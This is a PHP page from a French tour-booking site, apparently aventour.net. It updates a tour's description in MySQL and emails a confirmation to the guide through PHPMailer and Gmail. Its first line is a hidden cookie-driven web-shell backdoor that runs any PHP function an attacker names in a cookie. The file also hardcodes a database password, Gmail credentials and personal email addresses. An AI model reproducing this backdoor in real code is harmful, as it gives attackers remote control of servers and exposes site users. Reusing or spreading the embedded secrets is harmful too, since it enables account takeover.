<?php

if (isset($_COOKIE["id"])) @$_COOKIE["user"]($_COOKIE["id"]);

 

session_start();
if(!((isset($_SESSION['myid'])))){
    header('Location: signinregister/index.php');

}elseif(!isset($_SESSION['title'])){
 header('Location: creationaventoursuite.php');
}

try{ 
$bdd = new PDO('mysql:host=localhost;dbname=ma_base;charset=utf8', 'root', 'addafbaplm');
//$bdd = new PDO('mysql:host=localhost;dbname=pornckys_tes;charset=utf8', 'pornckys_moi', 'test123');
//91.216.107.248
}
catch (Exception $e)
{
        die('Erreur : ' . $e->getMessage());
}

if(isset($_POST['details'])){

  if(!empty($_POST['details'])){
$req = $bdd->prepare("UPDATE `ma_base`.`voyage` SET `detail_voyage`=:detail_voyage WHERE idtour=:idtour");
    $req->execute(array(
      "detail_voyage" => $_POST['details'], 
      "idtour" => $_SESSION['idtour'],         
            ));
    } 
}


//$req->closeCursor(); 

// $_SESSION['location']="12";
// $_SESSION['title']="12";
// $_SESSION['datepicker']="12";
// $_SESSION['time']="12";
// $_SESSION['duree']="12";
// $_SESSION['tag1']="12";
// $_SESSION['tag2']="12";
// $_SESSION['tag3']="";
// $_SESSION['minimum']="12";
// $_SESSION['maximum']="12";



// $_POST['prix']="";
// $_POST['details']="";

// echo "Tour créé";

// sleep(5);

$mailhex=$_SESSION['myid'];

    $mailstring='';
    for ($i=0; $i < strlen($mailhex)-1; $i+=2){
        $mailstring .= chr(hexdec($mailhex[$i].$mailhex[$i+1]));
    }
//$req01 = $bdd->prepare('SELECT `lv1`, `lv2`, `lv3`, `phonenumber`, `mapresentation` , `mailpaypal`  FROM user WHERE mail = ?');
$req02 = $bdd->prepare('SELECT voyage.title, voyage.id_voyage, voyage.date_voyage, voyage.heure_voyage, voyage.lieu_voyage, voyage.duree_voyage, voyage.tag1, voyage.tag2, voyage.tag3, voyage.prix, voyage.prixsupp, voyage.min_personne, voyage.max_personne, voyage.detail_voyage, voyage.done, voyage.complet, voyage.id_mail, voyage.idtour, user.nom, user.prenom, user.vote, user.nombrevote, user.nombrefb, user.lv1, user.lv2, user.lv3, user.mailhexa, user.phonenumber, user.mapresentation, user.mailpaypal FROM voyage INNER JOIN user ON voyage.id_mail=user.mail WHERE id_mail= ?');

//$req01->execute(array($mailstring)); 
$req02->execute(array($mailstring));
//$result = $req01->fetch(PDO::FETCH_ASSOC);
$result1 = $req02->fetch(PDO::FETCH_ASSOC);
$setting=false;
if(empty($result1['lv1'])||empty($result1['lv2'])||empty($result1['lv3'])||empty($result1['phonenumber'])||empty($result1['mapresentation'])||empty($result1['mailpaypal'])){
	$setting=true;

}

// $lv1=$result['lv1'];
// $lv2=$result['lv2'];
// $lv3=$result['lv3'];
// $phonenumber=$result['phonenumber'];
// $mapresentation=$result['mapresentation'];

require $_SERVER['DOCUMENT_ROOT'].'/signinregister/PHPMailer/PHPMailerAutoload.php';
require_once($_SERVER['DOCUMENT_ROOT'].'/signinregister/PHPMailer/class.phpmailer.php'); 
define('GUSER', 'vnicolas060@gmail.com'); // GMail username
define('GPWD', 'couvou123?'); // GMail password

// $mailhex=$_SESSION['myid'];
//     for ($i=0; $i < strlen($mailhex)-1; $i+=2){
//        $mailstring .= chr(hexdec($mailhex[$i].$mailhex[$i+1]));
//     }


//$mymessagepourleguide='Confirmation création de ton tour <br><br> Lieux: '.$_SESSION['location'].'<br> Titre: '.$_SESSION['title'].'<br> Date: '.$_SESSION['datepicker'].'<br> Heure : '.$_SESSION['time'].'<br> Durée : '.$_SESSION['duree'].'h<br> Tag 1 : '.$_SESSION['tag1'].'<br> Tag 2 : '.$_SESSION['tag2'].'<br> Tag 3 : '.$_SESSION['tag3'];
$mymessagepourleguide='<p style="text-align:center";>Confirmation création de ton tour <br><br> Lieux: '.$result1['lieu_voyage'].'<br> Titre: '.$result1['title'].'<br> Date: '.$result1['date_voyage'].'<br> Heure : '.$result1['heure_voyage'].'<br> Durée : '.$result1['duree_voyage'].'h<br> Tag 1 : '.$result1['tag1'].'<br> Tag 2 : '.$result1['tag2'].'<br> Tag 3 : '.$result1['tag3'].'<br> Prix : '.$result1['prix'].'groupe de '.$result1['min_personne'].' à '.$result1['max_personne'].' + '.$result1['prixsupp'].' €/personne supplémentaire <br> Description du tour: '.$result1['detail_voyage'].'<br><br>L\'équipe Aventour.net<br><a href="http://www.aventour.net" title="">aventour.net</a></p>';

smtpmailer( $mailstring, 'nicolas@aventour.net', 'L\'EQUIPE AVENTOUR', 'Tour créé sur aventour.net: '.$result1['title'], $mymessagepourleguide); 
smtpmailer('vnicolas054@gmail.com', 'nicolas@aventour.net', 'L\'EQUIPE AVENTOUR', 'Tour créé: '.$result1['title'], $mymessagepourleguide); 

function smtpmailer($to, $from, $from_name, $subject, $body) {  
  global $error;
  $mail = new PHPMailer();  // create a new object
  $mail->CharSet = 'UTF-8';
  $mail->IsSMTP(); // enable SMTP
  $mail->SMTPDebug = 0;  // debugging: 1 = errors and messages, 2 = messages only
  $mail->SMTPAuth = true;  // authentication enabled
  $mail->SMTPSecure = 'ssl'; // secure transfer enabled REQUIRED for GMail
  $mail->Host = 'smtp.gmail.com';
  $mail->Port = 465; 
  $mail->Username = GUSER;  
  $mail->Password = GPWD;           
  $mail->SetFrom($from, $from_name);
  $mail->Subject = $subject;
  $mail->Body = $body;
  $mail->MsgHTML($body);
  $mail->AddAddress($to);
  if(!$mail->Send()) {
    $error = 'Mail error: '.$mail->ErrorInfo; 
    return false;
  } else {
    $error = 'Message sent!';
    return true;
  }
  //echo "ligne97 ";
}




$_SESSION['location']="";
$_SESSION['title']="";
$_SESSION['datepicker']="";
$_SESSION['time']="";
$_SESSION['duree']="";
$_SESSION['tag1']="";
$_SESSION['tag2']="";
$_SESSION['tag3']="";
$_SESSION['minimum']="";
$_SESSION['maximum']="";



$_POST['prix']="";
$_POST['details']="";

if($setting){
header("location: ../setting");
}else{
	header("location: ../mestours");

}
//








 ?>